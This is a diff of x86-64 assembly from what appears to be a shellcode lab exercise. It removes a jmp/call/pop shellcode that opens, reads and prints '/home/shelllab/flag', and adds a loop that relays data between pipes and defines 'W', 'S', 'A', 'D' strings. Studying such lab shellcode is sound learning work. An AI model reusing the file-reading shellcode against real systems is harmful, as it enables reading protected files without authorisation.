@@ -1,36 +1,44 @@
+SYS_READ   equ 0
+SYS_WRITE  equ 1
+PIPE_READ  equ 0
+PIPE_WRITE equ 1
+BUF_SIZE   equ 64
+
+[section .special write exec]
 [global _start]
-  
 _start:
-  jmp ed
+  ; Copy shellcode's start address to `addr`
+  mov [rel addr], rdx
 
-st:
-  ; open(const char *filename, int flags, int mode);
-  pop rdi
-  xor rax, rax
-  add al, 2
+loop:
+  ; Clear `buf`
+  lea rbx, [rel buf]
   xor rsi, rsi
-  xor rdx, rdx
+__clear_buf:
+  mov byte [rbx+rsi], 0x00
+  inc rsi
+  cmp rsi, BUF_SIZE
+  jl  __clear_buf
+
+  ; Read data from pipe into `buf`
+  mov rax, SYS_READ
+  mov rdi, PIPE_READ
+  lea rsi, [rel buf]
+  mov rdx, BUF_SIZE
   syscall
 
-  ; read(int fd, const char *buf, size_t count);
-  mov rdi, rax  ; fd is in rax
-  xor rax, rax
-  sub rsp, 50  ; allocate a buffer on the stack
-  mov rsi, rsp
-  xor rdx, rdx
-  add dl, 50
+  ; write(int fd, const char *buf, size_t count)
+  mov rax, SYS_WRITE
+  mov rdi, PIPE_WRITE
+  lea rsi, [rel buf]
+  mov rdx, BUF_SIZE
   syscall
+  jmp loop
 
-  ; write(int fd, const char *buf, size_t count);
-  mov rdx, rax
-  xor rax, rax
-  add al, 1
-  xor rdi, rdi
-  inc rdi
-  syscall
-  ret
-  nop
-
-ed:
-  call st
-  db "/home/shelllab/flag", 0
+  ; --------------------------------------------
+  strW: db "W", 0
+  strS: db "S", 0
+  strA: db "A", 0
+  strD: db "D", 0
+  addr: dq 0
+  buf:  db 64 dup(0)
